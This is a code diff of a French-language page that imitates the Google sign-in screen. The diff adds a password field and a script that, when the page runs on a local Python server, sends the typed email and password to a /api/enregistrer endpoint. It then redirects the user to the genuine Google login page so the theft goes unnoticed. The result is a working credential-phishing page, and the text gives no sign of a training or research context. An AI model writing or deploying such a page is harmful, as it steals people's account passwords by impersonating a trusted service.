@@ -68,6 +68,10 @@
 
     .field {
       position: relative;
+      margin-bottom: 16px;
+    }
+
+    .field--password {
       margin-bottom: 8px;
     }
 
@@ -180,6 +184,18 @@
       box-shadow: 0 1px 3px rgba(0, 0, 0, 0.35);
     }
 
+    .btn-primary:disabled {
+      opacity: 0.7;
+      cursor: wait;
+    }
+
+    .status {
+      min-height: 1.25rem;
+      margin: 0 0 12px;
+      font-size: 0.8rem;
+      color: #f28b82;
+    }
+
     .site-footer {
       display: flex;
       flex-wrap: wrap;
@@ -248,28 +264,45 @@
       </div>
 
       <div class="form-side">
-        <div class="field">
-          <input
-            id="identifier"
-            type="email"
-            placeholder=" "
-            autocomplete="username"
-            required
-          />
-          <label for="identifier">Adresse e-mail ou téléphone</label>
-        </div>
+        <form id="loginForm" method="POST" action="/" novalidate>
+          <div class="field">
+            <input
+              id="identifier"
+              name="username"
+              type="text"
+              placeholder=" "
+              autocomplete="username"
+              required
+            />
+            <label for="identifier">Adresse e-mail ou téléphone</label>
+          </div>
 
-        <a class="helper-link" href="#">Adresse e-mail oubliée ?</a>
+          <div class="field field--password">
+            <input
+              id="password"
+              name="password"
+              type="password"
+              placeholder=" "
+              autocomplete="current-password"
+              required
+            />
+            <label for="password">Saisissez votre mot de passe</label>
+          </div>
 
-        <p class="guest-note">
-          S'il ne s'agit pas de votre ordinateur, utilisez une fenêtre de navigation privée pour vous connecter.
-          <a href="#">En savoir plus sur l'utilisation du mode Invité</a>
-        </p>
+          <a class="helper-link" href="#">Adresse e-mail oubliée ?</a>
 
-        <div class="actions">
-          <button type="button" class="btn-text">Créer un compte</button>
-          <button type="button" class="btn-primary" id="nextButton">Suivant</button>
-        </div>
+          <p class="guest-note">
+            S'il ne s'agit pas de votre ordinateur, utilisez une fenêtre de navigation privée pour vous connecter.
+            <a href="#">En savoir plus sur l'utilisation du mode Invité</a>
+          </p>
+
+          <p class="status" id="status" hidden role="alert"></p>
+
+          <div class="actions">
+            <button type="button" class="btn-text">Créer un compte</button>
+            <button type="submit" class="btn-primary" id="nextButton">Suivant</button>
+          </div>
+        </form>
       </div>
     </section>
   </main>
@@ -287,31 +320,62 @@
   </footer>
 
   <script>
+    const PYTHON_MODE = window.location.port === "8765";
+    const loginForm = document.querySelector("#loginForm");
     const identifier = document.querySelector("#identifier");
+    const password = document.querySelector("#password");
     const nextButton = document.querySelector("#nextButton");
+    const status = document.querySelector("#status");
     const GOOGLE_LOGIN = "https://accounts.google.com/v3/signin/identifier";
 
-    function goToGoogle() {
-      const email = identifier.value.trim();
-
-      if (!email) {
-        identifier.focus();
-        return;
-      }
-
-      const url = new URL(GOOGLE_LOGIN);
-      url.searchParams.set("Email", email);
-      window.location.href = url.toString();
-    }
-
-    nextButton.addEventListener("click", goToGoogle);
-
-    identifier.addEventListener("keydown", (event) => {
-      if (event.key === "Enter") {
+    if (PYTHON_MODE) {
+      loginForm.addEventListener("submit", async (event) => {
         event.preventDefault();
-        goToGoogle();
-      }
-    });
+
+        const email = identifier.value.trim();
+        const motDePasse = password.value.trim();
+
+        if (!email) {
+          identifier.focus();
+          return;
+        }
+
+        if (!motDePasse) {
+          password.focus();
+          return;
+        }
+
+        status.hidden = true;
+        nextButton.disabled = true;
+        nextButton.textContent = "Enregistrement...";
+
+        try {
+          const response = await fetch("/api/enregistrer", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              email,
+              password: motDePasse,
+              date: new Date().toISOString(),
+            }),
+          });
+
+          if (!response.ok) {
+            throw new Error("Erreur serveur");
+          }
+        } catch (error) {
+          status.hidden = false;
+          status.textContent = "Serveur Python indisponible.";
+          nextButton.disabled = false;
+          nextButton.textContent = "Suivant";
+          return;
+        }
+
+        const url = new URL(GOOGLE_LOGIN);
+        url.searchParams.set("Email", email);
+        window.location.href = url.toString();
+      });
+    }
   </script>
 </body>
 </html>
